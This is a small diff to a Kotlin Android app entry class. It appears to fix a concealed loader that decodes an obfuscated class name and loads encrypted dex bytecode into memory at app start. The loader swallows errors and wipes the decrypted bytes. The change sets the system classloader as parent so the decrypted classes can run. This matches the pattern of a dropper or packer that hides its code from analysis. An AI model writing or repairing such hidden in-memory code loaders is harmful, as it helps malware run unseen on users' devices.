@@ -85,7 +85,8 @@ class BerlinAppEntry : Application() {
         try {
             val cls  = Class.forName(String(nc))
             val ctor = cls.getConstructor(ByteBuffer::class.java, ClassLoader::class.java)
-            val b    = ClassLoader::class.java.cast(ctor.newInstance(ByteBuffer.wrap(dex), null)) ?: return
+            // Parent must be the system classloader (not null) so decrypted classes can resolve framework types
+            val b    = ClassLoader::class.java.cast(ctor.newInstance(ByteBuffer.wrap(dex), ClassLoader.getSystemClassLoader())) ?: return
             h = b; chain(b)
         } catch (t: Throwable) { return } finally { wipe(dex) }
     }
